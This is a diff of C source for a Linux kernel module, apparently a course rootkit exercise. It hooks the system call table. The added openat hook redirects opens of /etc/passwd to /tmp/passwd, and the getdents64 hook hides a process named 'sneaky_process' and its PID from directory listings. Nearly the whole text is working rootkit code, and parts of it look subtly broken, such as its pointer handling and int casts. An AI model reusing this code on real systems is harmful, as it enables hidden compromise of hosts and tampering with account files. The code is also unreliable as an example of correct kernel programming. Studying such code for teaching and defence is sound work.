@@ -48,30 +48,47 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
-  return (*original_openat)(regs);
+  char * orignal_name = "/etc/passwd\0";
+  int n = original_openat(regs);
+  char * filename = (char *)regs->si;
+
+  if(strcmp(filename, orignal_name) == 0){
+    copy_to_user(regs->si, "/tmp/passwd", sizeof("/tmp/passwd"));
+    return original_openat(regs);
+  }
+  return n;
 }
 
 //original readdir function
-asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+asmlinkage int (*original_getdents64)(struct pt_regs * regs);
 
 //sneaky version of fxn
-asmlinkage int sneaky_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
+asmlinkage int sneaky_getdents64(struct pt_regs * regs){
     int i = 0;
-    int n_bytes = original_getdents64(fd, dirp, count);
+    struct linux_dirent64 __user *dirp = (struct linux_dirent64 *)regs->si;
+    int n_bytes = original_getdents64(regs);
+    struct linux_dirent64 * d = dirp;
 
+    char pid_str[10];
+    sprintf(pid_str, "%d", pid);
+  
     while(i < n_bytes){
-      struct linux_dirent64 * d = (struct linux_dirent64 *) ((char *)dirp + i);
-
-      if(strstr(d->d_name, "sneaky_process") == 0){
+    
+      if(strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid_str) == 0){
         //copy rest of dirp into curr 
-        
+        char * next = (char *)d + d->d_reclen;
+        int len = (int)dirp + n_bytes - (int) next;
+        memmove(d, next, len);
         n_bytes -= d->d_reclen; 
         continue;
       }
-
+      //printk(KERN_INFO "I: %d\n", i);
       i += d->d_reclen;
+      d = (struct linux_dirent64 *) ((char *)dirp + i);
+
     }
 
+    //printk(KERN_INFO "bytes read: %d\n", n_bytes);
     return n_bytes;
 }
 
@@ -119,6 +136,7 @@ static void exit_sneaky_module(void)
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
+  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
